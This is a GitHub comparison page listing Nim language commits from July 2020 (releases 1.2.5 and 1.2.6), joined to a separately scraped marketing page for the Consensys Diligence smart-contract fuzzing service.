   * [Browse repository at this point](/nim-lang/Nim/tree/ddcbc1a58f82b9e3931e3ef5d1a8b4337ba50ccf)

   Copy the full SHA

    [ddcbc1a](/nim-lang/Nim/commit/ddcbc1a58f82b9e3931e3ef5d1a8b4337ba50ccf)View commit details

   Browse the repository at this point in the history

### Commits on Jul 22, 2020

1. [fix several newline problems (](/nim-lang/Nim/commit/e71395f5718326d45b6739c931ab6c0d80d79171)[#15028](https://github.com/nim-lang/Nim/pull/15028)[) [backend]](/nim-lang/Nim/commit/e71395f5718326d45b6739c931ab6c0d80d79171)
    …

   ```
   * prevent newlines where they shouldn't be
   * 'contentLength' shouldn't be negative

   (cherry picked from commit [5fafa2f](https://github.com/nim-lang/Nim/commit/5fafa2fd5c78232e4fe2d3d13bc67ab6c0cda0bb))
   ```

   [![@narimiran](https://avatars.githubusercontent.com/u/16516130?s=40&v=4)](/narimiran)

   [narimiran](/nim-lang/Nim/commits?author=narimiran "View all commits by narimiran")
   committed
   Jul 22, 2020

   Configuration menu

   * [View commit details](/nim-lang/Nim/commit/e71395f5718326d45b6739c931ab6c0d80d79171)
   * Copy full SHA for e71395f
   * [Browse repository at this point](/nim-lang/Nim/tree/e71395f5718326d45b6739c931ab6c0d80d79171)

   Copy the full SHA

    [e71395f](/nim-lang/Nim/commit/e71395f5718326d45b6739c931ab6c0d80d79171)View commit details

   Browse the repository at this point in the history
2. [asyncftpclient.nim - don't assume a sufficiend line length (](/nim-lang/Nim/commit/170f5b6229daabf147dd0382fce6765af15f77d8)[#14973](https://github.com/nim-lang/Nim/pull/14973)[)](/nim-lang/Nim/commit/170f5b6229daabf147dd0382fce6765af15f77d8)
    …

   ```
   (cherry picked from commit [f4f21c8](https://github.com/nim-lang/Nim/commit/f4f21c89e57115a57ed97e30a9b9fe6c901ae453))
   ```

   [![@narimiran](https://avatars.githubusercontent.com/u/16516130?s=40&v=4)](/narimiran)

   [narimiran](/nim-lang/Nim/commits?author=narimiran "View all commits by narimiran")
   committed
   Jul 22, 2020

   Configuration menu

   * [View commit details](/nim-lang/Nim/commit/170f5b6229daabf147dd0382fce6765af15f77d8)
   * Copy full SHA for 170f5b6
   * [Browse repository at this point](/nim-lang/Nim/tree/170f5b6229daabf147dd0382fce6765af15f77d8)

   Copy the full SHA

    [170f5b6](/nim-lang/Nim/commit/170f5b6229daabf147dd0382fce6765af15f77d8)View commit details

   Browse the repository at this point in the history

### Commits on Jul 23, 2020

1. [enforce browsers.nim only handles URLs [backport] (](/nim-lang/Nim/commit/d0a28576751b1b7e8c935ebcb75d44c3d189877e)[#15045](https://github.com/nim-lang/Nim/pull/15045)[)](/nim-lang/Nim/commit/d0a28576751b1b7e8c935ebcb75d44c3d189877e)
    …

   ```
   (cherry picked from commit [925dd92](https://github.com/nim-lang/Nim/commit/925dd92e07bd8b031c9f237ceb9e352c34a97d64))
   ```

   [![@Araq](https://avatars.githubusercontent.com/u/287816?s=40&v=4)](/Araq) [![@narimiran](https://avatars.githubusercontent.com/u/16516130?s=40&v=4)](/narimiran)

   [Araq](/nim-lang/Nim/commits?author=Araq "View all commits by Araq")
   authored and
   [narimiran](/nim-lang/Nim/commits?author=narimiran "View all commits by narimiran")
   committed
   Jul 23, 2020

   Configuration menu

   * [View commit details](/nim-lang/Nim/commit/d0a28576751b1b7e8c935ebcb75d44c3d189877e)
   * Copy full SHA for d0a2857
   * [Browse repository at this point](/nim-lang/Nim/tree/d0a28576751b1b7e8c935ebcb75d44c3d189877e)

   Copy the full SHA

    [d0a2857](/nim-lang/Nim/commit/d0a28576751b1b7e8c935ebcb75d44c3d189877e)View commit details

   Browse the repository at this point in the history
2. [bump NimVersion to 1.2.5](/nim-lang/Nim/commit/378dc7c9fb945c9602bbaaa385efead592714da2)

   [![@narimiran](https://avatars.githubusercontent.com/u/16516130?s=40&v=4)](/narimiran)

   [narimiran](/nim-lang/Nim/commits?author=narimiran "View all commits by narimiran")
   committed
   Jul 23, 2020

   Configuration menu

   * [View commit details](/nim-lang/Nim/commit/378dc7c9fb945c9602bbaaa385efead592714da2)
   * Copy full SHA for 378dc7c
   * [Browse repository at this point](/nim-lang/Nim/tree/378dc7c9fb945c9602bbaaa385efead592714da2)

   Copy the full SHA

    [378dc7c](/nim-lang/Nim/commit/378dc7c9fb945c9602bbaaa385efead592714da2)View commit details

   Browse the repository at this point in the history

### Commits on Jul 29, 2020

1. [Fulfill](/nim-lang/Nim/commit/c804e559ada40b6093faad1e25409280994985ab) [#14995 (comment)](https://github.com/nim-lang/Nim/pull/14995#issuecomment-664914391) [(](/nim-lang/Nim/commit/c804e559ada40b6093faad1e25409280994985ab)[#15104](https://github.com/nim-lang/Nim/pull/15104)[)](/nim-lang/Nim/commit/c804e559ada40b6093faad1e25409280994985ab)
    …

   ```
   request.  This can be conceived as an alternate, more capable resolution of
     [#12200](https://github.com/nim-lang/Nim/issues/12200)
   than
     [#12208](https://github.com/nim-lang/Nim/pull/12208)

   The code re-org idea here is to upgrade tablimpl.nim:`delImpl`/`delImplIdx`
   to abstract client code conventions for cell emptiness & cell hashing via
   three new template arguments - `makeEmpty`, `cellEmpty`, `cellHash` which
   all take a single integer argument and clear a cell, test if clear or
   produce the hash of the key stored at that index in `.data[]`.

   Then we update the 3 call sites (`Table`, `CountTable`, `SharedTable`) of
   `delImpl`/`delImplIdx` by defining define those arguments just before the
   first invocation as non-exported templates.

   Because `CountTable` does not save hash() outputs as `.hcode`, it needs a
   new tableimpl.nim:`delImplNoHCode` which simply in-lines the hash search
   when no `.hcode` field is available for "prefix compare" acceleration.
   It is conceivable this new template could be used by future variants, such
   as one optimized for integer keys where `hash()` and `==` are fast and
   `.hcode` is both wasted space & time (though a small change to interfaces
   there for a sentinel key meaning "empty" is needed for maximum efficiency).

   We also eliminate the old O(n) `proc remove(CountTable...)` in favor of
   simply invoking the new `delImpl*` templates and take care to correctly
   handle the case where `val` is either zero for non-existent keys in `inc`
   or evolves to zero over time in `[]=` or `inc`.

   The only user-visible changes from the +-42 delta here are speed, iteration
   order post deletes, and relaxing the `Positive` constraint on `val` in
   `proc inc` again, as indicated in the `changelog.md` entry.

   (cherry picked from commit [b2a1944](https://github.com/nim-lang/Nim/commit/b2a1944587bd23f87d05ed20cf33dd11c4c86e26))
   ```

   [![@c-blake](https://avatars.githubusercontent.com/u/8928205?s=40&v=4)](/c-blake) [![@narimiran](https://avatars.githubusercontent.com/u/16516130?s=40&v=4)](/narimiran)

   [c-blake](/nim-lang/Nim/commits?author=c-blake "View all commits by c-blake")
   authored and
   [narimiran](/nim-lang/Nim/commits?author=narimiran "View all commits by narimiran")
   committed
   Jul 29, 2020

   Configuration menu

   * [View commit details](/nim-lang/Nim/commit/c804e559ada40b6093faad1e25409280994985ab)
   * Copy full SHA for c804e55
   * [Browse repository at this point](/nim-lang/Nim/tree/c804e559ada40b6093faad1e25409280994985ab)

   Copy the full SHA

    [c804e55](/nim-lang/Nim/commit/c804e559ada40b6093faad1e25409280994985ab)View commit details

   Browse the repository at this point in the history
2. [bump NimVersion to 1.2.6](/nim-lang/Nim/commit/c0e1ee965ae06766476163395471561fe6755f07)

   [![@narimiran](https://avatars.githubusercontent.com/u/16516130?s=40&v=4)](/narimiran)

   [narimiran](/nim-lang/Nim/commits?author=narimiran "View all commits by narimiran")
   committed
   Jul 29, 2020

   Configuration menu

   * [View commit details](/nim-lang/Nim/commit/c0e1ee965ae06766476163395471561fe6755f07)
   * Copy full SHA for c0e1ee9
   * [Browse repository at this point](/nim-lang/Nim/tree/c0e1ee965ae06766476163395471561fe6755f07)

   Copy the full SHA

    [c0e1ee9](/nim-lang/Nim/commit/c0e1ee965ae06766476163395471561fe6755f07)View commit details

   Browse the repository at this point in the history
3. [fixes](/nim-lang/Nim/commit/b4ccdf870b8b830f50f5f9657e20d5e2c119efe6) [#15044](https://github.com/nim-lang/Nim/issues/15044) [[backport:1.2]](/nim-lang/Nim/commit/b4ccdf870b8b830f50f5f9657e20d5e2c119efe6)
    …

   ```
   (cherry picked from commit [c90c53e](https://github.com/nim-lang/Nim/commit/c90c53e8bb93c99a323684d73df7e7ec4791107d))
   ```

   [![@Araq](https://avatars.githubusercontent.com/u/287816?s=40&v=4)](/Araq) [![@narimiran](https://avatars.githubusercontent.com/u/16516130?s=40&v=4)](/narimiran)

   [Araq](/nim-lang/Nim/commits?author=Araq "View all commits by Araq")
   authored and
   [narimiran](/nim-lang/Nim/commits?author=narimiran "View all commits by narimiran")
   committed
   Jul 29, 2020

   Configuration menu

   * [View commit details](/nim-lang/Nim/commit/b4ccdf870b8b830f50f5f9657e20d5e2c119efe6)
   * Copy full SHA for b4ccdf8
   * [Browse repository at this point](/nim-lang/Nim/tree/b4ccdf870b8b830f50f5f9657e20d5e2c119efe6)

   Copy the full SHA

    [b4ccdf8](/nim-lang/Nim/commit/b4ccdf870b8b830f50f5f9657e20d5e2c119efe6)View commit details

   Browse the repository at this point in the history
4. [fixes](/nim-lang/Nim/commit/df490bd59f8469d93537b96931730ea45f927291) [#15056](https://github.com/nim-lang/Nim/issues/15056) [[backport]](/nim-lang/Nim/commit/df490bd59f8469d93537b96931730ea45f927291)
    …

   ```
   (cherry picked from commit [12a9fe0](https://github.com/nim-lang/Nim/commit/12a9fe017e4a49a161f5cabbbbcae0f5668b0ae3))
   ```

   [![@Araq](https://avatars.githubusercontent.com/u/287816?s=40&v=4)](/Araq) [![@narimiran](https://avatars.githubusercontent.com/u/16516130?s=40&v=4)](/narimiran)

   [Araq](/nim-lang/Nim/commits?author=Araq "View all commits by Araq")
   authored and
   [narimiran](/nim-lang/Nim/commits?author=narimiran "View all commits by narimiran")
   committed
   Jul 29, 2020

   Configuration menu

   * [View commit details](/nim-lang/Nim/commit/df490bd59f8469d93537b96931730ea45f927291)
   * Copy full SHA for df490bd
   * [Browse repository at this point](/nim-lang/Nim/tree/df490bd59f8469d93537b96931730ea45f927291)

   Copy the full SHA

    [df490bd](/nim-lang/Nim/commit/df490bd59f8469d93537b96931730ea45f927291)View commit details

   Browse the repository at this point in the history
5. [fix](/nim-lang/Nim/commit/a3f00b87e1e46160a320b94072ecca3b4bca1994) [#14534](https://github.com/nim-lang/Nim/issues/14534) [(](/nim-lang/Nim/commit/a3f00b87e1e46160a320b94072ecca3b4bca1994)[#15060](https://github.com/nim-lang/Nim/pull/15060)[) [backport]](/nim-lang/Nim/commit/a3f00b87e1e46160a320b94072ecca3b4bca1994)
    …

   ```
   (cherry picked from commit [9746868](https://github.com/nim-lang/Nim/commit/9746868832df3ef4b40597fb84f58900b2336496))
   ```

   [![@bung87](https://avatars.githubusercontent.com/u/2238294?s=40&v=4)](/bung87) [![@narimiran](https://avatars.githubusercontent.com/u/16516130?s=40&v=4)](/narimiran)

   [bung87](/nim-lang/Nim/commits?author=bung87 "View all commits by bung87")
   authored and
   [narimiran](/nim-lang/Nim/commits?author=narimiran "View all commits by narimiran")
   committed
   Jul 29, 2020

   Configuration menu

   * [View commit details](/nim-lang/Nim/commit/a3f00b87e1e46160a320b94072ecca3b4bca1994)
   * Copy full SHA for a3f00b8
   * [Browse repository at this point](/nim-lang/Nim/tree/a3f00b87e1e46160a320b94072ecca3b4bca1994)

   Copy the full SHA

    [a3f00b8](/nim-lang/Nim/commit/a3f00b87e1e46160a320b94072ecca3b4bca1994)View commit details

   Browse the repository at this point in the history
6. [fixes](/nim-lang/Nim/commit/f2844ba2d3adaa4985e4a36a4e75625cf6d70899) [#15038](https://github.com/nim-lang/Nim/issues/15038) [[backport:1.2]](/nim-lang/Nim/commit/f2844ba2d3adaa4985e4a36a4e75625cf6d70899)
    …

   ```
   (cherry picked from commit [aae998f](https://github.com/nim-lang/Nim/commit/aae998feff6d0234ee02311d59b299adfee0b01c))
   ```

   [![@Araq](https://avatars.githubusercontent.com/u/287816?s=40&v=4)](/Araq) [![@narimiran](https://avatars.githubusercontent.com/u/16516130?s=40&v=4)](/narimiran)

   [Araq](/nim-lang/Nim/commits?author=Araq "View all commits by Araq")
   authored and
   [narimiran](/nim-lang/Nim/commits?author=narimiran "View all commits by narimiran")
   committed
   Jul 29, 2020

   Configuration menu

   * [View commit details](/nim-lang/Nim/commit/f2844ba2d3adaa4985e4a36a4e75625cf6d70899)
   * Copy full SHA for f2844ba
   * [Browse repository at this point](/nim-lang/Nim/tree/f2844ba2d3adaa4985e4a36a4e75625cf6d70899)

   Copy the full SHA

    [f2844ba](/nim-lang/Nim/commit/f2844ba2d3adaa4985e4a36a4e75625cf6d70899)View commit details

   Browse the repository at this point in the history
7. [parsecsv: fix '\0' being displayed as '0' in docs (](/nim-lang/Nim/commit/896c3c41d31a6d36d990acdf23fe0ce351d7a6c9)[#15086](https://github.com/nim-lang/Nim/pull/15086)[) [backport]](/nim-lang/Nim/commit/896c3c41d31a6d36d990acdf23fe0ce351d7a6c9)
    …

   ```
   (cherry picked from commit [a62bc55](https://github.com/nim-lang/Nim/commit/a62bc5595598d6cc0f1e4edf1458fdbbda025572))
   ```

   [![@Jjp137](https://avatars.githubusercontent.com/u/1811645?s=40&v=4)](/Jjp137) [![@narimiran](https://avatars.githubusercontent.com/u/16516130?s=40&v=4)](/narimiran)

   [Jjp137](/nim-lang/Nim/commits?author=Jjp137 "View all commits by Jjp137")
   authored and
   [narimiran](/nim-lang/Nim/commits?author=narimiran "View all commits by narimiran")
   committed
   Jul 29, 2020

   Configuration menu

   * [View commit details](/nim-lang/Nim/commit/896c3c41d31a6d36d990acdf23fe0ce351d7a6c9)
   * Copy full SHA for 896c3c4
   * [Browse repository at this point](/nim-lang/Nim/tree/896c3c41d31a6d36d990acdf23fe0ce351d7a6c9)

   Copy the full SHA

    [896c3c4](/nim-lang/Nim/commit/896c3c41d31a6d36d990acdf23fe0ce351d7a6c9)View commit details

   Browse the repository at this point in the history
8. [fixes](/nim-lang/Nim/commit/9d11fc026b745a179eb7b004078c8722ccef05a0) [#14189](https://github.com/nim-lang/Nim/issues/14189) [(](/nim-lang/Nim/commit/9d11fc026b745a179eb7b004078c8722ccef05a0)[#15080](https://github.com/nim-lang/Nim/pull/15080)[) [backport]](/nim-lang/Nim/commit/9d11fc026b745a179eb7b004078c8722ccef05a0)
    …

   ```
   (cherry picked from commit [191c388](https://github.com/nim-lang/Nim/commit/191c388792c1b57c3855e9c3b9c83293be8a6207))
   ```

   [![@bung87](https://avatars.githubusercontent.com/u/2238294?s=40&v=4)](/bung87) [![@narimiran](https://avatars.githubusercontent.com/u/16516130?s=40&v=4)](/narimiran)

   [bung87](/nim-lang/Nim/commits?author=bung87 "View all commits by bung87")
   authored and
   [narimiran](/nim-lang/Nim/commits?author=narimiran "View all commits by narimiran")
   committed
   Jul 29, 2020

   Configuration menu

   * [View commit details](/nim-lang/Nim/commit/9d11fc026b745a179eb7b004078c8722ccef05a0)
   * Copy full SHA for 9d11fc0
   * [Browse repository at this point](/nim-lang/Nim/tree/9d11fc026b745a179eb7b004078c8722ccef05a0)

   Copy the full SHA

    [9d11fc0](/nim-lang/Nim/commit/9d11fc026b745a179eb7b004078c8722ccef05a0)View commit details

   Browse the repository at this point in the history
9. [fixes](/nim-lang/Nim/commit/e9d6d2b961b25d2e180044858052435ed1746e4e) [#14616](https://github.com/nim-lang/Nim/issues/14616) [[backport:1.2] (](/nim-lang/Nim/commit/e9d6d2b961b25d2e180044858052435ed1746e4e)[#15109](https://github.com/nim-lang/Nim/pull/15109)[)](/nim-lang/Nim/commit/e9d6d2b961b25d2e180044858052435ed1746e4e)
    …

   ```
   (cherry picked from commit [a3a87cd](https://github.com/nim-lang/Nim/commit/a3a87cdb298d7166846133bca5d56f055717474c))
   ```

   [![@Araq](https://avatars.githubusercontent.com/u/287816?s=40&v=4)](/Araq) [![@narimiran](https://avatars.githubusercontent.com/u/16516130?s=40&v=4)](/narimiran)

   [Araq](/nim-lang/Nim/commits?author=Araq "View all commits by Araq")
   authored and
   [narimiran](/nim-lang/Nim/commits?author=narimiran "View all commits by narimiran")
   committed
   Jul 29, 2020

   Configuration menu

   * [View commit details](/nim-lang/Nim/commit/e9d6d2b961b25d2e180044858052435ed1746e4e)
   * Copy full SHA for e9d6d2b
   * [Browse repository at this point](/nim-lang/Nim/tree/e9d6d2b961b25d2e180044858052435ed1746e4e)

   Copy the full SHA

    [e9d6d2b](/nim-lang/Nim/commit/e9d6d2b961b25d2e180044858052435ed1746e4e)View commit details

   Browse the repository at this point in the history
10. [Attempt to explain better why delImplIdx is the way it is. Maybe this…](/nim-lang/Nim/commit/bf320ed172f74f60fd274338e82bdc9ce3520dd9)
     …

    ```
    … can ([#15108](https://github.com/nim-lang/Nim/pull/15108))

    avoid future implementation mischief.  (Maybe not.  Sometimes, general
    distrust of theory leads people to distrust simple reasoning over times
    from CPUs trying as hard as possible to mask DRAM latency via pre-fetch.)

    (cherry picked from commit [196e747](https://github.com/nim-lang/Nim/commit/196e747df150ace81e7f4c01253128d4a89f03c7))
    ```

    [![@c-blake](https://avatars.githubusercontent.com/u/8928205?s=40&v=4)](/c-blake) [![@narimiran](https://avatars.githubusercontent.com/u/16516130?s=40&v=4)](/narimiran)

    [c-blake](/nim-lang/Nim/commits?author=c-blake "View all commits by c-blake")
    authored and
    [narimiran](/nim-lang/Nim/commits?author=narimiran "View all commits by narimiran")
    committed
    Jul 29, 2020

    Configuration menu

    * [View commit details](/nim-lang/Nim/commit/bf320ed172f74f60fd274338e82bdc9ce3520dd9)
    * Copy full SHA for bf320ed
    * [Browse repository at this point](/nim-lang/Nim/tree/bf320ed172f74f60fd274338e82bdc9ce3520dd9)

    Copy the full SHA

     [bf320ed](/nim-lang/Nim/commit/bf320ed172f74f60fd274338e82bdc9ce3520dd9)View commit details

    Browse the repository at this point in the history

 Loading

### This comparison is taking too long to generate.

Unfortunately it looks like we can’t render this comparison for you right now. It might be too big, or there might be something weird with your repository.

You can try running this command locally to see the comparison on your machine:

`git diff v1.2.4...v1.2.6`

  Retry

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from consensys.io_03fb8ddc_20250119_131033.html ===

[![Consensys Diligence](/images/logo/fuzzing-logo.svg)](/ "Home")

[Audits](/audits/ "Audits")
[Fuzzing](/fuzzing/ "Fuzzing")
[Scribble](/scribble/ "Scribble")
[Blog](/blog/ "Blog")
[Tools](/tools/ "Tools")
[Research](/research/ "Research")
[About](/about/ "About")
[Contact](/contact/ "Contact")

# Fuzz it.

##### Let's go next level smart contract security with Diligence Fuzzing.

The most powerful fuzzer to find bugs and vulnerabilities before they are exploited by bad actors on mainnet. Combine with Scribble to set a target and unleash the fuzzer with millions of transactions to stress test your smart contract.

[Start Fuzzing](https://fuzzing.diligence.tools/login)
[Explore Scribble](https://consensys.io/diligence/scribble/)

![Fuzzing](https://diligence.consensys.io/fuzzing/fuzzing-hero-side-image.png)

## What the Fuzz?

#### Diligence Fuzzing gray-box property-based Fuzzing

Diligence Fuzzing is the smartest Fuzzer we know. Powered by cutting-edge research, this tool pioneered smart heuristics
to push the boundaries of gray-box fuzzing.
Save some time. We create unit tests AND system tests for you. All
you need to do is deploy your smart contract and unleash the fuzzer. It will
generate sequences of transactions (just like a user or an attacker
would) to cover your code.

[Read Docs](https://fuzzing-docs.diligence.tools/)

Coverage-guided

i.e., greybox fuzzing to build corpus of inputs that increases coverage.

Input Prediction

Our unique input prediction allows to systematically find inputs that will cover new code instead of random mutations.

[Learn more](https://consensys.io/diligence/blog/2018/12/fuzzing-smart-contracts-using-input-prediction/)

Transaction Sequence Simulation

We simulate multiple transaction sequences to test “deeper” interactions between functions.

Time Machine

Time machine to test functionality that may break in the future by simulating different time intervals between transactions

Incremental Fuzzing

Enables quick feedback when starting campaigns on code that was already fuzzed.

Fuzzing Lessons

Allows users to provide specific transaction sequences to increase coverage of critical parts of your code.

![](https://diligence.consensys.io/fuzzing/background-features.jpg)
#### Reporting Features

Comprehensive reporting about your fuzzing campaign.

Campaign Monitoring

Observe the Fuzzer covering more and more of your code while thousands of tests are executed per second. Indications like "Residual Risk" help to determine when to stop a campaign.

![](https://diligence.consensys.io/fuzzing/CoverageScreenshot.png)

Full Control

Whether a short test or extensive campaign, public or private report, single or multiple, parallel campaigns, you have full control over the platform.

![](https://diligence.consensys.io/fuzzing/PropertyViolationScreenshot.png)

Full Report

Find out immediately when a property has been violated. Details about the transaction that triggered a vulnerability help you to fix your code.

![](https://diligence.consensys.io/fuzzing/ReportControlScreenshot.png)

Observe the Fuzzer covering more and more of your code while thousands of tests are executed per second. Indications like "Residual Risk" help to determine when to stop a campaign.

![](https://diligence.consensys.io/fuzzing/CoverageScreenshot.png)

Whether a short test or extensive campaign, public or private report, single or multiple, parallel campaigns, you have full control over the platform.

![](https://diligence.consensys.io/fuzzing/PropertyViolationScreenshot.png)

Find out immediately when a property has been violated. Details about the transaction that triggered a vulnerability help you to fix your code.

![](https://diligence.consensys.io/fuzzing/ReportControlScreenshot.png)

Create a faster, more efficient and secure SDLC

With millions of transactions flowing daily, blockchain
companies need reliable tools to secure the growing internet
of value on the blockchain. Diligence Fuzzing provides:

Fuzzing at scale

Diligence Fuzzing is the only fuzzing solution to cover complex systems of one or more contracts to explore all possible user interactions and vulnerabilities, without the need for harnesses.

Comprehensive Security

Fuzzing minimizes risk and checks performance through the execution of millions of intelligently selected inputs, exploring all possible interactions with users and potential attackers.

Business Logic Integrity

Test business logic at the outset, check for correctness, and find security problems before they steer the ship astray.

Productivity

Code reviews and consecutive bug fixes are time-consuming, with long feedback loops. With Diligence Fuzzing, developers get swift, actionable feedback.

Readability

Scribble annotations of your specs improve an auditor’s ability to find flaws in your smart contracts.

## Start Diligence Fuzzing in 3 steps

Specify properties, submit code, inspect the report.

### Step 1

Define Scribble specifications

To use Diligence Fuzzing you first need to define specifications for your smart contract using Scribble, describing how your smart contracts should work. The fuzzer will use these Scribble properties to check for inconsistencies.

[Read Docs](https://docs.scribble.codes/)

![](https://diligence.consensys.io/fuzzing/Step1ScribbleScreenshot.png)

### Step 2

Submit code

Submit your code to the Diligence Platform to run fuzzing campaigns. We’ll analyze all complex systems of one or more contracts provided to detect violations of custom properties.

[Read Docs](https://fuzzing-docs.diligence.tools/)

![](https://diligence.consensys.io/fuzzing/Step2CliScreenshot.png)

### Step 3

Review the results

Receive campaign results and fix the violations in your code.

![](https://diligence.consensys.io/fuzzing/Step3ViewReportScreenshot.png)

![](https://diligence.consensys.io/fuzzing/Step1ScribbleScreenshot.png)

![](https://diligence.consensys.io/fuzzing/Step2CliScreenshot.png)

![](https://diligence.consensys.io/fuzzing/Step3ViewReportScreenshot.png)

#### Trusted by businesses worldwide.

Our early adopters use Diligence Fuzzing to help secure their projects.

* + > With Diligence Fuzzing, Consensys gave us an amazing framework and capability to seamlessly develop, test and launch our smart contracts that are serving as the foundation for the new space economy.

    Grant Blaisdell

    CEO & Co-Founder of Copernic Space

    ![](https://diligence.consensys.io/fuzzing/TestemonialAvatar1.png)
  + > We deal with multiple clients who often require a fast, trusted and easy to understand service to conduct security audits on their Smart Contracts before they go live. We offer a service that includes the use of Diligence Fuzz tool to facilitate this and it is perfect for the job. Not only is it simple and easy to use, but it provides clear results for action along with quantifiable security guarantees from the Fuzzing process. We really enjoy using Diligence fuzz tool to provide this robust security check as part of our service!

    Tak Fung

    CEO & Founder of Smart Contract Security Limited

    ![](https://diligence.consensys.io/fuzzing/TestemonialAvatar2.png)

#### Simple pricing, for every need.

Get started with a free explorer plan or opt for our professional plans for builders. All plans billed monthly.

### Explorer

For users who want to explore fuzzing as an additional security layer.

#### $0

* 1x Core Performance
* Up to 100 5 min campaigns
* Run 1 Campaign at a time
* Supports Foundry projects

[Get Started](https://fuzzing.diligence.tools/login)

### Builder

For users who are ready to level up their security practices and stress test longer.

#### $250

* 1x Core Performance
* Unlimited 1 hour campaigns
* Run 1 Campaign at a time
* Supports Foundry projects

[Get Started](https://fuzzing.diligence.tools/login)

### Pro Builder

For power users who require serious security, in-depth analysis and no time constraints.

#### $1,999

* 2x Core Performance
* Unlimited Hours and campaigns
* Run 1 Campaign at a time
* Supports Foundry projects

[Get Started](https://fuzzing.diligence.tools/login)

### Enterprise

For larger teams needing multiple licenses, simultaneous campaigns and maximum performance.

#### Custom

* 4x Core Performance
* Unlimited Hours and campaigns
* Run 2 Campaigns at a time
* Supports Foundry projects

[Contact Us](https://share.hsforms.com/1TvCKjmAMTC2gCezqiexVTw2urwb)

![](/images/home/icon-ili-xs.png)

Request a Security Review Today

Get in touch with our team to request a quote for a smart contract audit.

[Contact Us](/contact/)

![](/images/home/icon-ili-outline-white.svg)

[Audits](/audits/ "Audits")
[Fuzzing](/fuzzing/ "Fuzzing")
[Scribble](/scribble/ "Scribble")
[Blog](/blog/ "Blog")
[Tools](/tools/ "Tools")
[Research](/research/ "Research")
[About](/about/ "About")
[Contact](/contact/ "Contact")
[Careers](https://consensys.io/open-roles/?discipline=32525 "Careers")
[Privacy Policy](/privacy-policy/ "Privacy Policy")

Subscribe to Our Newsletter

Stay up-to-date on our latest offerings, tools, and the world of blockchain security.

[![](/images/home/powered-by.svg)](https://consensys.io)


